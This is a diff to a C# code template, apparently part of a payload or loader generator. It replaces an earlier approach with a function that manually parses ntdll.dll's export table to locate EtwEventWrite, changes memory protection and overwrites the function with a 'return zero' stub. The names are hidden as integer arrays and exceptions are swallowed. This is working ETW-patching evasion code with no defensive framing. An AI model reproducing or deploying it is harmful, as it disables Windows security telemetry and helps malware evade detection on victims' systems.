@@ -48,15 +48,37 @@
 
             static void {{ v.fn_etw }}() {
                 try {
-                    var t = Type.GetType(B(new int[]{ {{ v.jsc_eventing_ep }} }));
-                    if (t != null) {
-                        var fi = t.GetField(B(new int[]{ {{ v.jsc_m_enabled }} }),
-                            BindingFlags.NonPublic | BindingFlags.Instance);
+                    IntPtr ntdll = IntPtr.Zero;
+                    foreach (System.Diagnostics.ProcessModule m in
+                             System.Diagnostics.Process.GetCurrentProcess().Modules)
+                        if (m.ModuleName.ToLower() == B(new int[]{110,116,100,108,108,46,100,108,108})) {
+                            ntdll = m.BaseAddress; break;
+                        }
+                    if (ntdll == IntPtr.Zero) return;
+                    int peo    = Marshal.ReadInt32(ntdll, 0x3C);
+                    int exprva = Marshal.ReadInt32(IntPtr.Add(ntdll, peo + 0x88));
+                    if (exprva == 0) return;
+                    IntPtr ed  = IntPtr.Add(ntdll, exprva);
+                    int nn     = Marshal.ReadInt32(ed, 0x18);
+                    int nrva   = Marshal.ReadInt32(ed, 0x20);
+                    int orva   = Marshal.ReadInt32(ed, 0x24);
+                    int frva   = Marshal.ReadInt32(ed, 0x1C);
+                    byte[] tgt = new byte[]{69,116,119,69,118,101,110,116,87,114,105,116,101,0};
+                    for (int i = 0; i < nn; i++) {
+                        IntPtr np = IntPtr.Add(ntdll, Marshal.ReadInt32(IntPtr.Add(ntdll, nrva + i*4)));
+                        bool ok = true;
+                        for (int j = 0; j < tgt.Length; j++)
+                            if (Marshal.ReadByte(IntPtr.Add(np, j)) != tgt[j]) { ok = false; break; }
+                        if (!ok) continue;
+                        short ord = Marshal.ReadInt16(IntPtr.Add(ntdll, orva + i*2));
+                        IntPtr fn = IntPtr.Add(ntdll, Marshal.ReadInt32(IntPtr.Add(ntdll, frva + ord*4)));
+                        uint old; VirtualProtect(fn, 3, 0x40, out old);
+                        Marshal.WriteByte(fn, 0, 0x33);
+                        Marshal.WriteByte(fn, 1, 0xC0);
+                        Marshal.WriteByte(fn, 2, 0xC3);
+                        VirtualProtect(fn, 3, old, out old);
+                        break;
                     }
-                } catch {}
-                try {
-                    // Direct ntdll patch via Marshal
-                    var ntdll = Marshal.GetHINSTANCE(typeof(object).Module);
                 } catch {}
             }
 
